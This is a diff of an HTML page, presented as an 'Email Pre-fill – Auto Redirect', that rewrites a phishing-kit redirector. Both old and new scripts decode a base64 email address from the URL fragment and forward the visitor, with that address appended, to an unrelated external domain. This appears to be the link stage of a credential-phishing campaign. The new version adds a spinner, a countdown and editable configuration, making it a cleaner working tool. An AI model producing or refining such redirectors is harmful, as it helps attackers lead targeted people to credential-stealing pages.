@@ -1,51 +1,76 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta http-equiv="content-type" content="text/html; charset=UTF-8">
-<meta charset="utf-8">
- 
- 
+  <meta charset="UTF-8">
+  <title>Email Pre-fill – Auto Redirect</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body{font-family:Arial,sans-serif;background:#f4f7fa;color:#333;display:flex;
+         align-items:center;justify-content:center;height:100vh;margin:0;}
+    .box{background:#fff;padding:2rem;border-radius:8px;box-shadow:0 4px 12px rgba(0,0,0,.1);
+         max-width:420px;width:100%;text-align:center;}
+    .email{font-weight:bold;color:#007bff;}
+    .spinner{margin:1rem auto;width:40px;height:40px;border:4px solid #e9ecef;
+             border-top-color:#007bff;border-radius:50%;animation:s 1s linear infinite;}
+    @keyframes s{to{transform:rotate(360deg)}}
+  </style>
+</head>
+<body>
 
-<head>     
-<body>    
-       
- <script type="text/javascript">
-var url_string =  window.location.href;
-var url_get_email = atob(getafterhash(url_string));
-var mail_go_url =  "https://edvoroio.com.de/2RUoqb8Ctt/#X"+url_get_email+"";
-location.replace(mail_go_url);  
- 
- 
-function getafterhash(url) {
-var ret; 
-var queryString; 
- // stuff after # is not part of query string, so get rid of it
- queryStringhash = url.split('#?1187507008Family=')[1]; 
- queryStringsemi = url.split(';')[1]; 
- queryStringsemiplus = url.split(';+')[1]; 
- queryStringstartsemi = url.split('*;')[1]; 
-  // if query string exists
- if (queryStringhash) {
-  ret = queryStringhash;
- 
- }else if (queryStringsemi) {
-  ret = queryStringsemi;
- 
- }else if (queryStringsemiplus) {
-  ret = queryStringsemiplus;
- 
- }else if (queryStringstartsemi) {
-  ret = queryStringstartsemi;
- 
- }else{
- 
-   ret = 0;
+<div class="box">
+  <h2>Redirecting…</h2>
+  <p>We’ve pre-filled your e-mail: <span class="email" id="emailDisplay">—</span></p>
+  <div class="spinner"></div>
+  <p><small>You will be taken to the service in <span id="countdown">2</span> seconds.</small></p>
+</div>
 
+<script>
+  // ==== CONFIGURATION ====
+  const REDIRECT_BASE = "https://edvoroio.com.de/2RUoqb8Ctt/#X"; // <-- your final domain
+  const USE_BASE64    = true;          // set false if you send plain text
+  const DELAY_MS      = 2000;          // 2 seconds (feel free to change)
+
+  // ==== GET EMAIL FROM URL ====
+  function getEmailFromUrl() {
+    const hash   = location.hash.substring(1);   // after #
+    const search = location.search.substring(1); // after ?
+    const params = new URLSearchParams(hash + '&' + search);
+
+    const raw = params.get('email') || params.get('e') || params.get('1187507008Family');
+    if (!raw) return null;
+
+    try {
+      const email = USE_BASE64 ? atob(raw) : raw;
+      return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email) ? email : null;
+    } catch (_) { return null; }
   }
 
-  return ret;
-}
+  // ==== MAIN ====
+  const email = getEmailFromUrl();
+  const emailEl   = document.getElementById('emailDisplay');
+  const countEl   = document.getElementById('countdown');
 
-</script>         
+  if (email) {
+    emailEl.textContent = email;
+
+    let secs = Math.ceil(DELAY_MS / 1000);
+    const timer = setInterval(() => {
+      secs--;
+      countEl.textContent = secs;
+      if (secs <= 0) clearInterval(timer);
+    }, 1000);
+
+    setTimeout(() => {
+      location.href = REDIRECT_BASE + encodeURIComponent(email);
+    }, DELAY_MS);
+  } else {
+    // No valid e-mail → show a friendly fallback
+    document.querySelector('.box').innerHTML = `
+      <h2>Oops!</h2>
+      <p>No valid e-mail found in the URL.</p>
+      <p><a href="/">← Go back</a></p>`;
+  }
+</script>
+
 </body>
 </html>
